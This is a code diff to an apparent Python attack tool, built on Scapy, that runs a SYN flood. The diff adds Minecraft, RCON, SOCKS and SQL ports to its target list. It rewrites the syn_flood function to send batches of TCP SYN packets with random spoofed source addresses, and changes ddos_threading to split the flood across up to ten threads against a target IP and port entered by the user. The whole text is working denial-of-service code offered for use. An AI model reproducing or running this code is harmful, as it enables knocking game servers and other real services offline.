@@ -52,25 +52,31 @@ PORTS = {21: 'FTP',
          53: 'DNS',
          80: 'HTTP',
          443: 'HTTPS',
+         1080: 'SOCKS',
+         1433: 'SQL',
          3389: 'RDP',
          8080: 'ALT HTTP',
-         19312: 'Bedrock',
-         25565: 'JavaServer'}
+         8123: 'Dynmap Plugin',
+         19132: 'Bedrock',
+         19133: 'ALT Bedrock',
+         25565: 'JavaServer',
+         25575: 'RCON'}
 
 
-def syn_flood(dst_ip: str, dst_port: int):
-    ip_packet = IP()
-    ip_packet.src = ".".join(map(str, [randint(0, 255) for _ in range(4)]))
-    ip_packet.dst = dst_ip
-
-    tcp_packet = TCP()
-    tcp_packet.sport = randint(1000, 9000)
-    tcp_packet.dport = dst_port
-    tcp_packet.flags = "S"
-    tcp_packet.seq = randint(1000, 9000)
-    tcp_packet.window = randint(1000, 9000)
-
-    send(ip_packet / tcp_packet, verbose=0)
+def syn_flood(dst_ip: str, dst_port: int, counter: int):
+    for i in range(counter):
+        ip_packet = IP()
+        ip_packet.src = ".".join(map(str, [randint(0, 255) for _ in range(4)]))
+        ip_packet.dst = dst_ip
+    
+        tcp_packet = TCP()
+        tcp_packet.sport = randint(1000, 9000)
+        tcp_packet.dport = dst_port
+        tcp_packet.flags = "S"
+        tcp_packet.seq = randint(1000, 9000)
+        tcp_packet.window = randint(1000, 9000)
+    
+        send(ip_packet / tcp_packet, verbose=0)
 
 
 def ddos_threading():
@@ -78,10 +84,13 @@ def ddos_threading():
     dst_ip = input("\n               Target IP: ")
     dst_port = int(input("               Target Port: "))
 
+    thread_count = min(int(counter ** (1. / 4)), 10) #thread count is root 4 of packet count, maxed at 10
+    packets_per_thread = int(counter / thread_count)
+
     print("               Packets are sending...")
-    for i in range(counter):
-        ddos_thread = threading.Thread(target=syn_flood, args=[dst_ip, dst_port], daemon=True)
-        print(f'               {Fore.LB}[{i}]{Fore.W} Sent packet to {Fore.LIGHTYELLOW_EX}{dst_ip}:{dst_port}{Fore.W}')
+    for i in range(thread_count):
+        ddos_thread = threading.Thread(target=syn_flood, args=[dst_ip, dst_port, packets_per_thread], daemon=True)
+        print(f'               {Fore.LB}[{i}]{Fore.W} Sent {packets_per_thread} packets to {Fore.LIGHTYELLOW_EX}{dst_ip}:{dst_port}{Fore.W}')
         time.sleep(0.001)
         ddos_thread.start()
     print(f"\n               Total packets sent: {counter}\n")
